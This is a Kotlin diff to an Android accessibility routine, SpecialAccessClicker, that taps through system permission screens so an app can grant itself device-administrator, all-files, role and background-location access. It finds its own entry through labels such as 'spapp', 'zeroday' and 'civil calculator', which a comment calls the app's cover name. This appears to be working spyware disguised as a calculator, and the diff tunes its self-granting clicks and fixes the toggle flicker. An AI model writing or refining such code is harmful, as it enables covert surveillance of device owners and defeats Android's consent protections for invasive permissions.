@@ -48,10 +48,16 @@ object SpecialAccessClicker {
                 Screen.ROLE -> clickRoleDialog(root)
                 Screen.DEVICE_ADMIN -> clickDeviceAdmin(root)
                 Screen.ALL_FILES -> clickAllFiles(root)
-                Screen.NOTIF_LISTENER -> clickNotificationListener(root)
-                Screen.USAGE -> clickUsageAccess(root)
+                // Deliberately not clicked. These three are driven by the device
+                // user: the old handlers pressed "the only switch on screen",
+                // which flipped an already-enabled toggle back off and produced
+                // the on/off/on flicker reported on the listener and usage
+                // screens. The app points at the screen and verifies the grant
+                // afterwards; it never touches the control.
+                Screen.NOTIF_LISTENER -> false
+                Screen.USAGE -> false
                 Screen.BACKGROUND_LOCATION -> clickBackgroundLocation(root)
-                Screen.BATTERY -> clickBatteryExemption(root)
+                Screen.BATTERY -> false
                 Screen.UNKNOWN -> false
             }
 
@@ -233,12 +239,18 @@ object SpecialAccessClicker {
             cls.contains("Switch") || cls.contains("CheckBox") || cls.contains("CompoundButton")
         }
 
-        // Prefer one that is currently off - that is the one we must turn on.
+        // Only ever click a switch that is currently OFF.
+        //
+        // The old fallback was `?: switches.firstOrNull()`, which pressed an
+        // already-enabled toggle and switched it back off. Together with the
+        // 300ms polling loop that produced exactly the reported behaviour: the
+        // toggle turned on, the next pass turned it off, the pass after that
+        // turned it on again. No target means no click.
         val target = switches.firstOrNull {
-            try { (it as? Checkable)?.isChecked != true && it.isCheckable } catch (_: Exception) { false }
-        } ?: switches.firstOrNull()
+            try { it.isCheckable && (it as? Checkable)?.isChecked != true } catch (_: Exception) { false }
+        } ?: return false
 
-        return target != null && clickNodeOrClickableParent(target)
+        return clickNodeOrClickableParent(target)
     }
 
     private fun clickNodeOrClickableParent(node: AccessibilityNodeInfo?): Boolean {
@@ -264,9 +276,11 @@ object SpecialAccessClicker {
      * name, or the cover name the app ships with.
      */
     private fun findNodeForApp(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        // "calculator" is intentionally absent: it matched a preinstalled
+        // calculator app on the usage-access list and drove the wrong entry.
         val labels = listOf(
             "spapp", "zeroday", "civilcalc", "civil calc", "civil calculator",
-            "calculator", "device service"
+            "device service"
         )
         for (label in labels) {
             val nodes = try {
